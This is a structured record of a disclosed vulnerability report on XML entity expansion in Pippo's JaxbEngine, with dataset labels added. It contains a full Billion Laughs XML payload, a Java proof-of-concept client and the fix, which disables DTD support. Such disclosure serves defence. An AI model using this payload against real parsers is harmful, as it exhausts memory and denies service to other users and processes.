{
  "reported_to": "Central Security Project",
  "reported_by": "amassey ",
  "title": "Pippo XML Entity Expansion (Billion Laughs Attack)",
  "content": "\nMaven artifact\ngroupId: ro.pippo\nartifactId: pippo-jaxb\nversion: 1.12.0\nVulnerability\nVulnerability Description\nPippo unsafely parses user provided XML. The fromString() in the ro.pippo.jaxb.JaxbEngine class allows user provided DTDs that the rest of the XML may reference. This can lead to recursive entity expansion and a subsequent billion laughs attack.\nAdditional Details\nSource File and Line Number: https://github.com/pippo-java/pippo/blob/7da9f4db945d10113cf4ea4ed44ba0f1a7f83a8f/pippo-content-type-parent/pippo-jaxb/src/main/java/ro/pippo/jaxb/JaxbEngine.java#L78\nSteps To Reproduce:\nDetailed steps to reproduce with all required references/steps/commands. Any sample/exploit code or other proof of concept.\nSupply below XML payload as an argument to the following Java main method which is a client of Pippo.\nEnjoy watching the JVM crash.\nXML Payload that Results in Recursive Entity Expansion\nCode 1.18 KiB\n1<?xml version=\"1.0\"?>\n2<!DOCTYPE PERSON [\n3        <!ENTITY PERSON \"PERSON\">\n4        <!ELEMENT PERSON (#PCDATA)>\n5        <!ENTITY PERSON1 \"&PERSON;&PERSON;&PERSON;&PERSON;&PERSON;&PERSON;&PERSON;&PERSON;&PERSON;&PERSON;\">\n6        <!ENTITY PERSON2 \"&PERSON1;&PERSON1;&PERSON1;&PERSON1;&PERSON1;&PERSON1;&PERSON1;&PERSON1;&PERSON1;&PERSON1;\">\n7        <!ENTITY PERSON3 \"&PERSON2;&PERSON2;&PERSON2;&PERSON2;&PERSON2;&PERSON2;&PERSON2;&PERSON2;&PERSON2;&PERSON2;\">\n8        <!ENTITY PERSON4 \"&PERSON3;&PERSON3;&PERSON3;&PERSON3;&PERSON3;&PERSON3;&PERSON3;&PERSON3;&PERSON3;&PERSON3;\">\n9        <!ENTITY PERSON5 \"&PERSON4;&PERSON4;&PERSON4;&PERSON4;&PERSON4;&PERSON4;&PERSON4;&PERSON4;&PERSON4;&PERSON4;\">\n10        <!ENTITY PERSON6 \"&PERSON5;&PERSON5;&PERSON5;&PERSON5;&PERSON5;&PERSON5;&PERSON5;&PERSON5;&PERSON5;&PERSON5;\">\n11        <!ENTITY PERSON7 \"&PERSON6;&PERSON6;&PERSON6;&PERSON6;&PERSON6;&PERSON6;&PERSON6;&PERSON6;&PERSON6;&PERSON6;\">\n12        <!ENTITY PERSON8 \"&PERSON7;&PERSON7;&PERSON7;&PERSON7;&PERSON7;&PERSON7;&PERSON7;&PERSON7;&PERSON7;&PERSON7;\">\n13        <!ENTITY PERSON9 \"&PERSON8;&PERSON8;&PERSON8;&PERSON8;&PERSON8;&PERSON8;&PERSON8;&PERSON8;&PERSON8;&PERSON8;\">\n14        ]>\n15\n16<PERSON>&PERSON9;</PERSON>\nJava Code that acts as a Pippo Client\nCode 553 Bytes\n1import org.apache.commons.io.IOUtil;\n2import ro.pippo.jaxb.JaxbEngine;\n3import java.io.IOException;\n4\n5\n6public class JaxBEnginePoC {\n7\n8    public static void main(String[] args) throws IOException {\n9\n10        String resourceName = args[0];\n11\n12        String payload = IOUtil.toString(\n13                JaxBEnginePoC.class.getResourceAsStream(resourceName),\n14                \"UTF-8\"\n15        );\n16\n17        JaxbEngine jaxbEngine = new JaxbEngine();\n18        Object myObj = jaxbEngine.fromString(payload, Person.class);\n19\n20        System.out.println(\"Completed!\");\n21    }\n22}\nPatch\nIf you're able to provide a patch with the fix, please post it in this section (or attach)\nxmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, true);\nShould Be\nxmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false);\nSupporting Material/References:\nState all technical information about the stack where the vulnerability was found\nDarwin Kernel Version 18.2.0\nJava jdk1.8.0_171\nWrap up\nSelect Y or N for the following statements:\nI contacted the maintainer to let them know: N\nI opened an issue in the related repository: N\nFinder's comments and funny memes goes here\nhttp://i.imgur.com/3POtveC.jpg\nIs it pronounced imgur or imgur? Gif or Gif?\nImpact\nIt causes a DoS. Specifically: Entities are created recursively and large amounts of heap memory is taken. Eventually, the JVM process will run out of memory. Otherwise, if the OS does not bound the memory on that process, memory will continue to be exhausted and will affect other processes on the system.\n\n",
  "severity": [
    8.3,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "XML Entity Expansion"
  ],
  "screenshots": {},
  "disclosed_date": 1560189840,
  "report_url": "https://hackerone.com/reports/506791",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Supply the XML payload with recursive entity expansion as input to the Java application."
    ],
    [
      2,
      "Run the Java application with the JaxbEngine class to parse the XML, triggering the Billion Laughs attack."
    ]
  ],
  "vuln_description": "The vulnerability is an XML Entity Expansion (Billion Laughs Attack) in Pippo's JaxbEngine class, where user-provided XML with DTDs is unsafely parsed, allowing recursive entity expansion that consumes excessive memory, leading to a Denial of Service (DoS).",
  "reason": "The attack involves a well-known XML parsing vulnerability pattern (Billion Laughs) and requires minimal setup or understanding of complex application states. The steps to reproduce are straightforward and do not involve subtle interactions or novel logic.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}